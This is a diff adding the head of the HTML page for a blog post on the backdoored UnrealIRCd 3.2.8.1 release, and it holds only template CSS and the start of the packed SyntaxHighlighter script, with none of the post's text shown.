@@ -1,0 +1,3645 @@
+<!DOCTYPE html>
+<html dir='ltr' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+<link href='https://www.blogger.com/static/v1/widgets/4165133002-widget_css_bundle.css' rel='stylesheet' type='text/css'/>
+<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
+<meta content='blogger' name='generator'/>
+<link href='https://blog.stalkr.net/favicon.ico' rel='icon' type='image/x-icon'/>
+<link href='https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html' rel='canonical'/>
+<link rel="alternate" type="application/atom+xml" title="StalkR&#39;s Blog - Atom" href="https://blog.stalkr.net/feeds/posts/default" />
+<link rel="alternate" type="application/rss+xml" title="StalkR&#39;s Blog - RSS" href="https://blog.stalkr.net/feeds/posts/default?alt=rss" />
+<link rel="service.post" type="application/atom+xml" title="StalkR&#39;s Blog - Atom" href="https://www.blogger.com/feeds/9099779/posts/default" />
+
+<link rel="alternate" type="application/atom+xml" title="StalkR&#39;s Blog - Atom" href="https://blog.stalkr.net/feeds/4574631714866481251/comments/default" />
+<!--Can't find substitution for tag [blog.ieCssRetrofitLinks]-->
+<meta content='https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html' property='og:url'/>
+<meta content='UnrealIRCd 3.2.8.1 backdoored, investigation' property='og:title'/>
+<meta content='UnrealIRCd  is a great IRC  server software (daemon) and very popular among mid-sized networks because of its highly advanced features and t...' property='og:description'/>
+<title>StalkR's Blog: UnrealIRCd 3.2.8.1 backdoored, investigation</title>
+<style id='page-skin-1' type='text/css'><!--
+/*
+-----------------------------------------------
+Blogger Template Style
+Name:     Minima Black
+Designer: Douglas Bowman
+URL:      www.stopdesign.com
+Date:     26 Feb 2004
+Updated by: Blogger Team
+----------------------------------------------- */
+#navbar-iframe {
+display: none !important;
+}
+/* Variable definitions
+====================
+<Variable name="bgcolor" description="Page Background Color"
+type="color" default="#000">
+<Variable name="textcolor" description="Text Color"
+type="color" default="#ccc">
+<Variable name="linkcolor" description="Link Color"
+type="color" default="#9ad">
+<Variable name="pagetitlecolor" description="Blog Title Color"
+type="color" default="#ccc">
+<Variable name="descriptioncolor" description="Blog Description Color"
+type="color" default="#777">
+<Variable name="titlecolor" description="Post Title Color"
+type="color" default="#ad9">
+<Variable name="bordercolor" description="Border Color"
+type="color" default="#333">
+<Variable name="sidebarcolor" description="Sidebar Title Color"
+type="color" default="#777">
+<Variable name="sidebartextcolor" description="Sidebar Text Color"
+type="color" default="#999">
+<Variable name="visitedlinkcolor" description="Visited Link Color"
+type="color" default="#a7a">
+<Variable name="bodyfont" description="Text Font"
+type="font" default="normal normal 100% 'Trebuchet MS',Trebuchet,Verdana,Sans-serif">
+<Variable name="headerfont" description="Sidebar Title Font"
+type="font"
+default="normal bold 78% 'Trebuchet MS',Trebuchet,Arial,Verdana,Sans-serif">
+<Variable name="pagetitlefont" description="Blog Title Font"
+type="font"
+default="normal bold 200% 'Trebuchet MS',Trebuchet,Verdana,Sans-serif">
+<Variable name="descriptionfont" description="Blog Description Font"
+type="font"
+default="normal normal 78% 'Trebuchet MS', Trebuchet, Verdana, Sans-serif">
+<Variable name="postfooterfont" description="Post Footer Font"
+type="font"
+default="normal normal 78% 'Trebuchet MS', Trebuchet, Arial, Verdana, Sans-serif">
+<Variable name="startSide" description="Start side in blog language"
+type="automatic" default="left">
+<Variable name="endSide" description="End side in blog language"
+type="automatic" default="right">
+*/
+/* Use this with templates/template-twocol.html */
+body {
+background:#000000;
+margin:0;
+color:#cccccc;
+font: x-small "Trebuchet MS", Trebuchet, Verdana, Sans-serif;
+font-size: small;
+text-align: center;
+}
+a:link {
+color:#99aadd;
+text-decoration:none;
+}
+a:visited {
+color:#aa77aa;
+text-decoration:none;
+}
+a:hover {
+color:#aadd99;
+text-decoration:underline;
+}
+a img {
+border-width:0;
+}
+/* Header
+-----------------------------------------------
+*/
+#header-wrapper {
+width:900px;
+margin:0 auto 10px;
+border:1px solid #333333;
+}
+#header-inner {
+background-position: center;
+margin-left: auto;
+margin-right: auto;
+}
+#header {
+margin: 5px;
+border: 1px solid #333333;
+text-align: center;
+color:#cccccc;
+}
+#header h1 {
+margin:5px 5px 0;
+padding:15px 20px .25em;
+line-height:1.2em;
+text-transform:uppercase;
+letter-spacing:.2em;
+font: normal bold 200% 'Trebuchet MS',Trebuchet,Verdana,Sans-serif;
+}
+#header a {
+color:#cccccc;
+text-decoration:none;
+}
+#header a:hover {
+color:#cccccc;
+}
+#header .description {
+margin:0 5px 5px;
+padding:0 20px 15px;
+max-width:940px;
+text-transform:uppercase;
+letter-spacing:.2em;
+line-height: 1.4em;
+font: normal normal 78% 'Trebuchet MS', Trebuchet, Verdana, Sans-serif;
+color: #777777;
+}
+#header img {
+margin-left: auto;
+margin-right: auto;
+}
+/* Outer-Wrapper
+----------------------------------------------- */
+#outer-wrapper {
+width: 900px;
+margin:0 auto;
+padding:10px;
+text-align:left;
+font: normal normal 100% 'Trebuchet MS',Trebuchet,Verdana,Sans-serif;
+}
+#main-wrapper {
+width: 650px;
+float: left;
+word-wrap: break-word; /* fix for long text breaking sidebar float in IE */
+overflow: hidden;     /* fix for long non-text content breaking IE sidebar float */
+}
+#sidebar-wrapper {
+width: 220px;
+float: right;
+word-wrap: break-word; /* fix for long text breaking sidebar float in IE */
+overflow: hidden;     /* fix for long non-text content breaking IE sidebar float */
+}
+/* Headings
+----------------------------------------------- */
+h2 {
+margin:1.5em 0 .75em;
+font:normal bold 78% 'Trebuchet MS',Trebuchet,Arial,Verdana,Sans-serif;
+line-height: 1.4em;
+text-transform:uppercase;
+letter-spacing:.2em;
+color:#777777;
+}
+/* Posts
+-----------------------------------------------
+*/
+h2.date-header {
+margin:1.5em 0 .5em;
+}
+.post {
+margin:.5em 0 1.5em;
+border-bottom:1px dotted #333333;
+padding-bottom:1.5em;
+}
+.post h3 {
+margin:.25em 0 0;
+padding:0 0 4px;
+font-size:140%;
+font-weight:normal;
+line-height:1.4em;
+color:#aadd99;
+}
+.post h3 a, .post h3 a:visited, .post h3 strong {
+display:block;
+text-decoration:none;
+color:#aadd99;
+font-weight:bold;
+}
+.post h3 strong, .post h3 a:hover {
+color:#cccccc;
+}
+.post-body {
+margin:0 0 .75em;
+line-height:1.6em;
+}
+.post-body blockquote {
+line-height:1.3em;
+}
+.post-footer {
+margin: .75em 0;
+color:#777777;
+text-transform:uppercase;
+letter-spacing:.1em;
+font: normal normal 78% 'Trebuchet MS', Trebuchet, Arial, Verdana, Sans-serif;
+line-height: 1.4em;
+}
+.comment-link {
+margin-left:.6em;
+}
+.post img {
+padding:4px;
+border:1px solid #333333;
+}
+.post blockquote {
+margin:1em 20px;
+}
+.post blockquote p {
+margin:.75em 0;
+}
+/* Comments
+----------------------------------------------- */
+#comments h4 {
+margin:1em 0;
+font-weight: bold;
+line-height: 1.4em;
+text-transform:uppercase;
+letter-spacing:.2em;
+color: #777777;
+}
+#comments-block {
+margin:1em 0 1.5em;
+line-height:1.6em;
+}
+#comments-block .comment-author {
+margin:.5em 0;
+}
+#comments-block .comment-body {
+margin:.25em 0 0;
+}
+#comments-block .comment-footer {
+margin:-.25em 0 2em;
+line-height: 1.4em;
+text-transform:uppercase;
+letter-spacing:.1em;
+}
+#comments-block .comment-body p {
+margin:0 0 .75em;
+}
+.deleted-comment {
+font-style:italic;
+color:gray;
+}
+.feed-links {
+clear: both;
+line-height: 2.5em;
+}
+#blog-pager-newer-link {
+float: left;
+}
+#blog-pager-older-link {
+float: right;
+}
+#blog-pager {
+text-align: center;
+}
+/* Sidebar Content
+----------------------------------------------- */
+.sidebar {
+color: #999999;
+line-height: 1.5em;
+}
+.sidebar ul {
+list-style:none;
+margin:0 0 0;
+padding:0 0 0;
+}
+.sidebar li {
+margin:0;
+padding-top:0;
+padding-right:0;
+padding-bottom:.25em;
+padding-left:15px;
+text-indent:-15px;
+line-height:1.5em;
+}
+.sidebar .widget, .main .widget {
+border-bottom:1px dotted #333333;
+margin:0 0 1.5em;
+padding:0 0 1.5em;
+}
+.main .Blog {
+border-bottom-width: 0;
+}
+/* Profile
+----------------------------------------------- */
+.profile-img {
+float: left;
+margin-top: 0;
+margin-right: 5px;
+margin-bottom: 5px;
+margin-left: 0;
+padding: 4px;
+border: 1px solid #333333;
+}
+.profile-data {
+margin:0;
+text-transform:uppercase;
+letter-spacing:.1em;
+font: normal normal 78% 'Trebuchet MS', Trebuchet, Arial, Verdana, Sans-serif;
+color: #777777;
+font-weight: bold;
+line-height: 1.6em;
+}
+.profile-datablock {
+margin:.5em 0 .5em;
+}
+.profile-textblock {
+margin: 0.5em 0;
+line-height: 1.6em;
+}
+.profile-link {
+font: normal normal 78% 'Trebuchet MS', Trebuchet, Arial, Verdana, Sans-serif;
+text-transform: uppercase;
+letter-spacing: .1em;
+}
+/* Footer
+----------------------------------------------- */
+#footer {
+width:660px;
+clear:both;
+margin:0 auto;
+padding-top:15px;
+line-height: 1.6em;
+text-transform:uppercase;
+letter-spacing:.1em;
+text-align: center;
+}
+
+--></style>
+<style type='text/css'>
+/* shCore.css */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+.syntaxhighlighter a,
+.syntaxhighlighter div,
+.syntaxhighlighter code,
+.syntaxhighlighter table,
+.syntaxhighlighter table td,
+.syntaxhighlighter table tr,
+.syntaxhighlighter table tbody,
+.syntaxhighlighter table thead,
+.syntaxhighlighter table caption,
+.syntaxhighlighter textarea {
+  -moz-border-radius: 0 0 0 0 !important;
+  -webkit-border-radius: 0 0 0 0 !important;
+  background: none !important;
+  border: 0 !important;
+  bottom: auto !important;
+  float: none !important;
+  height: auto !important;
+  left: auto !important;
+  line-height: 1.1em !important;
+  margin: 0 !important;
+  outline: 0 !important;
+  overflow: visible !important;
+  padding: 0 !important;
+  position: static !important;
+  right: auto !important;
+  text-align: left !important;
+  top: auto !important;
+  vertical-align: baseline !important;
+  width: auto !important;
+  box-sizing: content-box !important;
+  font-family: "Consolas", "Bitstream Vera Sans Mono", "Courier New", Courier, monospace !important;
+  font-weight: normal !important;
+  font-style: normal !important;
+  font-size: 1em !important;
+  min-height: inherit !important;
+  min-height: auto !important;
+}
+
+.syntaxhighlighter {
+  width: 100% !important;
+  margin: 1em 0 1em 0 !important;
+  position: relative !important;
+  overflow: auto !important;
+  font-size: 1em !important;
+}
+.syntaxhighlighter.source {
+  overflow: hidden !important;
+}
+.syntaxhighlighter .bold {
+  font-weight: bold !important;
+}
+.syntaxhighlighter .italic {
+  font-style: italic !important;
+}
+.syntaxhighlighter .line {
+  white-space: pre !important;
+}
+.syntaxhighlighter table {
+  width: 100% !important;
+}
+.syntaxhighlighter table caption {
+  text-align: left !important;
+  padding: .5em 0 0.5em 1em !important;
+}
+.syntaxhighlighter table td.code {
+  width: 100% !important;
+}
+.syntaxhighlighter table td.code .container {
+  position: relative !important;
+}
+.syntaxhighlighter table td.code .container textarea {
+  box-sizing: border-box !important;
+  position: absolute !important;
+  left: 0 !important;
+  top: 0 !important;
+  width: 100% !important;
+  height: 100% !important;
+  border: none !important;
+  background: white !important;
+  padding-left: 1em !important;
+  overflow: hidden !important;
+  white-space: pre !important;
+}
+.syntaxhighlighter table td.gutter .line {
+  text-align: right !important;
+  padding: 0 0.5em 0 1em !important;
+}
+.syntaxhighlighter table td.code .line {
+  padding: 0 1em !important;
+}
+.syntaxhighlighter.nogutter td.code .container textarea, .syntaxhighlighter.nogutter td.code .line {
+  padding-left: 0em !important;
+}
+.syntaxhighlighter.show {
+  display: block !important;
+}
+.syntaxhighlighter.collapsed table {
+  display: none !important;
+}
+.syntaxhighlighter.collapsed .toolbar {
+  padding: 0.1em 0.8em 0em 0.8em !important;
+  font-size: 1em !important;
+  position: static !important;
+  width: auto !important;
+  height: auto !important;
+}
+.syntaxhighlighter.collapsed .toolbar span {
+  display: inline !important;
+  margin-right: 1em !important;
+}
+.syntaxhighlighter.collapsed .toolbar span a {
+  padding: 0 !important;
+  display: none !important;
+}
+.syntaxhighlighter.collapsed .toolbar span a.expandSource {
+  display: inline !important;
+}
+.syntaxhighlighter .toolbar {
+  position: absolute !important;
+  right: 1px !important;
+  top: 1px !important;
+  width: 11px !important;
+  height: 11px !important;
+  font-size: 10px !important;
+  z-index: 10 !important;
+}
+.syntaxhighlighter .toolbar span.title {
+  display: inline !important;
+}
+.syntaxhighlighter .toolbar a {
+  display: block !important;
+  text-align: center !important;
+  text-decoration: none !important;
+  padding-top: 1px !important;
+}
+.syntaxhighlighter .toolbar a.expandSource {
+  display: none !important;
+}
+.syntaxhighlighter.ie {
+  font-size: .9em !important;
+  padding: 1px 0 1px 0 !important;
+}
+.syntaxhighlighter.ie .toolbar {
+  line-height: 8px !important;
+}
+.syntaxhighlighter.ie .toolbar a {
+  padding-top: 0px !important;
+}
+.syntaxhighlighter.printing .line.alt1 .content,
+.syntaxhighlighter.printing .line.alt2 .content,
+.syntaxhighlighter.printing .line.highlighted .number,
+.syntaxhighlighter.printing .line.highlighted.alt1 .content,
+.syntaxhighlighter.printing .line.highlighted.alt2 .content {
+  background: none !important;
+}
+.syntaxhighlighter.printing .line .number {
+  color: #bbbbbb !important;
+}
+.syntaxhighlighter.printing .line .content {
+  color: black !important;
+}
+.syntaxhighlighter.printing .toolbar {
+  display: none !important;
+}
+.syntaxhighlighter.printing a {
+  text-decoration: none !important;
+}
+.syntaxhighlighter.printing .plain, .syntaxhighlighter.printing .plain a {
+  color: black !important;
+}
+.syntaxhighlighter.printing .comments, .syntaxhighlighter.printing .comments a {
+  color: #008200 !important;
+}
+.syntaxhighlighter.printing .string, .syntaxhighlighter.printing .string a {
+  color: blue !important;
+}
+.syntaxhighlighter.printing .keyword {
+  color: #006699 !important;
+  font-weight: bold !important;
+}
+.syntaxhighlighter.printing .preprocessor {
+  color: gray !important;
+}
+.syntaxhighlighter.printing .variable {
+  color: #aa7700 !important;
+}
+.syntaxhighlighter.printing .value {
+  color: #009900 !important;
+}
+.syntaxhighlighter.printing .functions {
+  color: #ff1493 !important;
+}
+.syntaxhighlighter.printing .constants {
+  color: #0066cc !important;
+}
+.syntaxhighlighter.printing .script {
+  font-weight: bold !important;
+}
+.syntaxhighlighter.printing .color1, .syntaxhighlighter.printing .color1 a {
+  color: gray !important;
+}
+.syntaxhighlighter.printing .color2, .syntaxhighlighter.printing .color2 a {
+  color: #ff1493 !important;
+}
+.syntaxhighlighter.printing .color3, .syntaxhighlighter.printing .color3 a {
+  color: red !important;
+}
+.syntaxhighlighter.printing .break, .syntaxhighlighter.printing .break a {
+  color: black !important;
+}
+</style>
+<style type='text/css'>
+/* shThemeDefault.css */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+.syntaxhighlighter {
+  background-color: white !important;
+}
+.syntaxhighlighter .line.alt1 {
+  background-color: white !important;
+}
+.syntaxhighlighter .line.alt2 {
+  background-color: white !important;
+}
+.syntaxhighlighter .line.highlighted.alt1, .syntaxhighlighter .line.highlighted.alt2 {
+  background-color: #e0e0e0 !important;
+}
+.syntaxhighlighter .line.highlighted.number {
+  color: black !important;
+}
+.syntaxhighlighter table caption {
+  color: black !important;
+}
+.syntaxhighlighter .gutter {
+  color: #afafaf !important;
+}
+.syntaxhighlighter .gutter .line {
+  border-right: 3px solid #6ce26c !important;
+}
+.syntaxhighlighter .gutter .line.highlighted {
+  background-color: #6ce26c !important;
+  color: white !important;
+}
+.syntaxhighlighter.printing .line .content {
+  border: none !important;
+}
+.syntaxhighlighter.collapsed {
+  overflow: visible !important;
+}
+.syntaxhighlighter.collapsed .toolbar {
+  color: blue !important;
+  background: white !important;
+  border: 1px solid #6ce26c !important;
+}
+.syntaxhighlighter.collapsed .toolbar a {
+  color: blue !important;
+}
+.syntaxhighlighter.collapsed .toolbar a:hover {
+  color: red !important;
+}
+.syntaxhighlighter .toolbar {
+  color: white !important;
+  background: #6ce26c !important;
+  border: none !important;
+}
+.syntaxhighlighter .toolbar a {
+  color: white !important;
+}
+.syntaxhighlighter .toolbar a:hover {
+  color: black !important;
+}
+.syntaxhighlighter .plain, .syntaxhighlighter .plain a {
+  color: black !important;
+}
+.syntaxhighlighter .comments, .syntaxhighlighter .comments a {
+  color: #008200 !important;
+}
+.syntaxhighlighter .string, .syntaxhighlighter .string a {
+  color: blue !important;
+}
+.syntaxhighlighter .keyword {
+  color: #006699 !important;
+}
+.syntaxhighlighter .preprocessor {
+  color: gray !important;
+}
+.syntaxhighlighter .variable {
+  color: #aa7700 !important;
+}
+.syntaxhighlighter .value {
+  color: #009900 !important;
+}
+.syntaxhighlighter .functions {
+  color: #ff1493 !important;
+}
+.syntaxhighlighter .constants {
+  color: #0066cc !important;
+}
+.syntaxhighlighter .script {
+  font-weight: bold !important;
+  color: #006699 !important;
+  background-color: none !important;
+}
+.syntaxhighlighter .color1, .syntaxhighlighter .color1 a {
+  color: gray !important;
+}
+.syntaxhighlighter .color2, .syntaxhighlighter .color2 a {
+  color: #ff1493 !important;
+}
+.syntaxhighlighter .color3, .syntaxhighlighter .color3 a {
+  color: red !important;
+}
+
+.syntaxhighlighter .keyword {
+  font-weight: bold !important;
+}
+</style>
+<script type='text/javascript'>
+/* shCore.js */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('K M;I(M)1S 2U("2a\'t 4k M 4K 2g 3l 4G 4H");(6(){6 r(f,e){I(!M.1R(f))1S 3m("3s 15 4R");K a=f.1w;f=M(f.1m,t(f)+(e||""));I(a)f.1w={1m:a.1m,19:a.19?a.19.1a(0):N};H f}6 t(f){H(f.1J?"g":"")+(f.4s?"i":"")+(f.4p?"m":"")+(f.4v?"x":"")+(f.3n?"y":"")}6 B(f,e,a,b){K c=u.L,d,h,g;v=R;5K{O(;c--;){g=u[c];I(a&g.3r&&(!g.2p||g.2p.W(b))){g.2q.12=e;I((h=g.2q.X(f))&&h.P===e){d={3k:g.2b.W(b,h,a),1C:h};1N}}}}5v(i){1S i}5q{v=11}H d}6 p(f,e,a){I(3b.Z.1i)H f.1i(e,a);O(a=a||0;a<f.L;a++)I(f[a]===e)H a;H-1}M=6(f,e){K a=[],b=M.1B,c=0,d,h;I(M.1R(f)){I(e!==1d)1S 3m("2a\'t 5r 5I 5F 5B 5C 15 5E 5p");H r(f)}I(v)1S 2U("2a\'t W 3l M 59 5m 5g 5x 5i");e=e||"";O(d={2N:11,19:[],2K:6(g){H e.1i(g)>-1},3d:6(g){e+=g}};c<f.L;)I(h=B(f,c,b,d)){a.U(h.3k);c+=h.1C[0].L||1}Y I(h=n.X.W(z[b],f.1a(c))){a.U(h[0]);c+=h[0].L}Y{h=f.3a(c);I(h==="[")b=M.2I;Y I(h==="]")b=M.1B;a.U(h);c++}a=15(a.1K(""),n.Q.W(e,w,""));a.1w={1m:f,19:d.2N?d.19:N};H a};M.3v="1.5.0";M.2I=1;M.1B=2;K C=/\\$(?:(\\d\\d?|[$&`\'])|{([$\\w]+)})/g,w=/[^5h]+|([\\s\\S])(?=[\\s\\S]*\\1)/g,A=/^(?:[?*+]|{\\d+(?:,\\d*)?})\\??/,v=11,u=[],n={X:15.Z.X,1A:15.Z.1A,1C:1r.Z.1C,Q:1r.Z.Q,1e:1r.Z.1e},x=n.X.W(/()??/,"")[1]===1d,D=6(){K f=/^/g;n.1A.W(f,"");H!f.12}(),y=6(){K f=/x/g;n.Q.W("x",f,"");H!f.12}(),E=15.Z.3n!==1d,z={};z[M.2I]=/^(?:\\\\(?:[0-3][0-7]{0,2}|[4-7][0-7]?|x[\\29-26-f]{2}|u[\\29-26-f]{4}|c[A-3o-z]|[\\s\\S]))/;z[M.1B]=/^(?:\\\\(?:0(?:[0-3][0-7]{0,2}|[4-7][0-7]?)?|[1-9]\\d*|x[\\29-26-f]{2}|u[\\29-26-f]{4}|c[A-3o-z]|[\\s\\S])|\\(\\?[:=!]|[?*+]\\?|{\\d+(?:,\\d*)?}\\??)/;M.1h=6(f,e,a,b){u.U({2q:r(f,"g"+(E?"y":"")),2b:e,3r:a||M.1B,2p:b||N})};M.2n=6(f,e){K a=f+"/"+(e||"");H M.2n[a]||(M.2n[a]=M(f,e))};M.3c=6(f){H r(f,"g")};M.5l=6(f){H f.Q(/[-[\\]{}()*+?.,\\\\^$|#\\s]/g,"\\\\$&")};M.5e=6(f,e,a,b){e=r(e,"g"+(b&&E?"y":""));e.12=a=a||0;f=e.X(f);H b?f&&f.P===a?f:N:f};M.3q=6(){M.1h=6(){1S 2U("2a\'t 55 1h 54 3q")}};M.1R=6(f){H 53.Z.1q.W(f)==="[2m 15]"};M.3p=6(f,e,a,b){O(K c=r(e,"g"),d=-1,h;h=c.X(f);){a.W(b,h,++d,f,c);c.12===h.P&&c.12++}I(e.1J)e.12=0};M.57=6(f,e){H 6 a(b,c){K d=e[c].1I?e[c]:{1I:e[c]},h=r(d.1I,"g"),g=[],i;O(i=0;i<b.L;i++)M.3p(b[i],h,6(k){g.U(d.3j?k[d.3j]||"":k[0])});H c===e.L-1||!g.L?g:a(g,c+1)}([f],0)};15.Z.1p=6(f,e){H J.X(e[0])};15.Z.W=6(f,e){H J.X(e)};15.Z.X=6(f){K e=n.X.1p(J,14),a;I(e){I(!x&&e.L>1&&p(e,"")>-1){a=15(J.1m,n.Q.W(t(J),"g",""));n.Q.W(f.1a(e.P),a,6(){O(K c=1;c<14.L-2;c++)I(14[c]===1d)e[c]=1d})}I(J.1w&&J.1w.19)O(K b=1;b<e.L;b++)I(a=J.1w.19[b-1])e[a]=e[b];!D&&J.1J&&!e[0].L&&J.12>e.P&&J.12--}H e};I(!D)15.Z.1A=6(f){(f=n.X.W(J,f))&&J.1J&&!f[0].L&&J.12>f.P&&J.12--;H!!f};1r.Z.1C=6(f){M.1R(f)||(f=15(f));I(f.1J){K e=n.1C.1p(J,14);f.12=0;H e}H f.X(J)};1r.Z.Q=6(f,e){K a=M.1R(f),b,c;I(a&&1j e.58()==="3f"&&e.1i("${")===-1&&y)H n.Q.1p(J,14);I(a){I(f.1w)b=f.1w.19}Y f+="";I(1j e==="6")c=n.Q.W(J,f,6(){I(b){14[0]=1f 1r(14[0]);O(K d=0;d<b.L;d++)I(b[d])14[0][b[d]]=14[d+1]}I(a&&f.1J)f.12=14[14.L-2]+14[0].L;H e.1p(N,14)});Y{c=J+"";c=n.Q.W(c,f,6(){K d=14;H n.Q.W(e,C,6(h,g,i){I(g)5b(g){24"$":H"$";24"&":H d[0];24"`":H d[d.L-1].1a(0,d[d.L-2]);24"\'":H d[d.L-1].1a(d[d.L-2]+d[0].L);5a:i="";g=+g;I(!g)H h;O(;g>d.L-3;){i=1r.Z.1a.W(g,-1)+i;g=1Q.3i(g/10)}H(g?d[g]||"":"$")+i}Y{g=+i;I(g<=d.L-3)H d[g];g=b?p(b,i):-1;H g>-1?d[g+1]:h}})})}I(a&&f.1J)f.12=0;H c};1r.Z.1e=6(f,e){I(!M.1R(f))H n.1e.1p(J,14);K a=J+"",b=[],c=0,d,h;I(e===1d||+e<0)e=5D;Y{e=1Q.3i(+e);I(!e)H[]}O(f=M.3c(f);d=f.X(a);){I(f.12>c){b.U(a.1a(c,d.P));d.L>1&&d.P<a.L&&3b.Z.U.1p(b,d.1a(1));h=d[0].L;c=f.12;I(b.L>=e)1N}f.12===d.P&&f.12++}I(c===a.L){I(!n.1A.W(f,"")||h)b.U("")}Y b.U(a.1a(c));H b.L>e?b.1a(0,e):b};M.1h(/\\(\\?#[^)]*\\)/,6(f){H n.1A.W(A,f.2S.1a(f.P+f[0].L))?"":"(?:)"});M.1h(/\\((?!\\?)/,6(){J.19.U(N);H"("});M.1h(/\\(\\?<([$\\w]+)>/,6(f){J.19.U(f[1]);J.2N=R;H"("});M.1h(/\\\\k<([\\w$]+)>/,6(f){K e=p(J.19,f[1]);H e>-1?"\\\\"+(e+1)+(3R(f.2S.3a(f.P+f[0].L))?"":"(?:)"):f[0]});M.1h(/\\[\\^?]/,6(f){H f[0]==="[]"?"\\\\b\\\\B":"[\\\\s\\\\S]"});M.1h(/^\\(\\?([5A]+)\\)/,6(f){J.3d(f[1]);H""});M.1h(/(?:\\s+|#.*)+/,6(f){H n.1A.W(A,f.2S.1a(f.P+f[0].L))?"":"(?:)"},M.1B,6(){H J.2K("x")});M.1h(/\\./,6(){H"[\\\\s\\\\S]"},M.1B,6(){H J.2K("s")})})();1j 2e!="1d"&&(2e.M=M);K 1v=6(){6 r(a,b){a.1l.1i(b)!=-1||(a.1l+=" "+b)}6 t(a){H a.1i("3e")==0?a:"3e"+a}6 B(a){H e.1Y.2A[t(a)]}6 p(a,b,c){I(a==N)H N;K d=c!=R?a.3G:[a.2G],h={"#":"1c",".":"1l"}[b.1o(0,1)]||"3h",g,i;g=h!="3h"?b.1o(1):b.5u();I((a[h]||"").1i(g)!=-1)H a;O(a=0;d&&a<d.L&&i==N;a++)i=p(d[a],b,c);H i}6 C(a,b){K c={},d;O(d 2g a)c[d]=a[d];O(d 2g b)c[d]=b[d];H c}6 w(a,b,c,d){6 h(g){g=g||1P.5y;I(!g.1F){g.1F=g.52;g.3N=6(){J.5w=11}}c.W(d||1P,g)}a.3g?a.3g("4U"+b,h):a.4y(b,h,11)}6 A(a,b){K c=e.1Y.2j,d=N;I(c==N){c={};O(K h 2g e.1U){K g=e.1U[h];d=g.4x;I(d!=N){g.1V=h.4w();O(g=0;g<d.L;g++)c[d[g]]=h}}e.1Y.2j=c}d=e.1U[c[a]];d==N&&b!=11&&1P.1X(e.13.1x.1X+(e.13.1x.3E+a));H d}6 v(a,b){O(K c=a.1e("\\n"),d=0;d<c.L;d++)c[d]=b(c[d],d);H c.1K("\\n")}6 u(a,b){I(a==N||a.L==0||a=="\\n")H a;a=a.Q(/</g,"&1y;");a=a.Q(/ {2,}/g,6(c){O(K d="",h=0;h<c.L-1;h++)d+=e.13.1W;H d+" "});I(b!=N)a=v(a,6(c){I(c.L==0)H"";K d="";c=c.Q(/^(&2s;| )+/,6(h){d=h;H""});I(c.L==0)H d;H d+\'<17 1g="\'+b+\'">\'+c+"</17>"});H a}6 n(a,b){a.1e("\\n");O(K c="",d=0;d<50;d++)c+="                    ";H a=v(a,6(h){I(h.1i("\\t")==-1)H h;O(K g=0;(g=h.1i("\\t"))!=-1;)h=h.1o(0,g)+c.1o(0,b-g%b)+h.1o(g+1,h.L);H h})}6 x(a){H a.Q(/^\\s+|\\s+$/g,"")}6 D(a,b){I(a.P<b.P)H-1;Y I(a.P>b.P)H 1;Y I(a.L<b.L)H-1;Y I(a.L>b.L)H 1;H 0}6 y(a,b){6 c(k){H k[0]}O(K d=N,h=[],g=b.2D?b.2D:c;(d=b.1I.X(a))!=N;){K i=g(d,b);I(1j i=="3f")i=[1f e.2L(i,d.P,b.23)];h=h.1O(i)}H h}6 E(a){K b=/(.*)((&1G;|&1y;).*)/;H a.Q(e.3A.3M,6(c){K d="",h=N;I(h=b.X(c)){c=h[1];d=h[2]}H\'<a 2h="\'+c+\'">\'+c+"</a>"+d})}6 z(){O(K a=1E.36("1k"),b=[],c=0;c<a.L;c++)a[c].3s=="20"&&b.U(a[c]);H b}6 f(a){a=a.1F;K b=p(a,".20",R);a=p(a,".3O",R);K c=1E.4i("3t");I(!(!a||!b||p(a,"3t"))){B(b.1c);r(b,"1m");O(K d=a.3G,h=[],g=0;g<d.L;g++)h.U(d[g].4z||d[g].4A);h=h.1K("\\r");c.39(1E.4D(h));a.39(c);c.2C();c.4C();w(c,"4u",6(){c.2G.4E(c);b.1l=b.1l.Q("1m","")})}}I(1j 3F!="1d"&&1j M=="1d")M=3F("M").M;K e={2v:{"1g-27":"","2i-1s":1,"2z-1s-2t":11,1M:N,1t:N,"42-45":R,"43-22":4,1u:R,16:R,"3V-17":R,2l:11,"41-40":R,2k:11,"1z-1k":11},13:{1W:"&2s;",2M:R,46:11,44:11,34:"4n",1x:{21:"4o 1m",2P:"?",1X:"1v\\n\\n",3E:"4r\'t 4t 1D O: ",4g:"4m 4B\'t 51 O 1z-1k 4F: ",37:\'<!4T 1z 4S "-//4V//3H 4W 1.0 4Z//4Y" 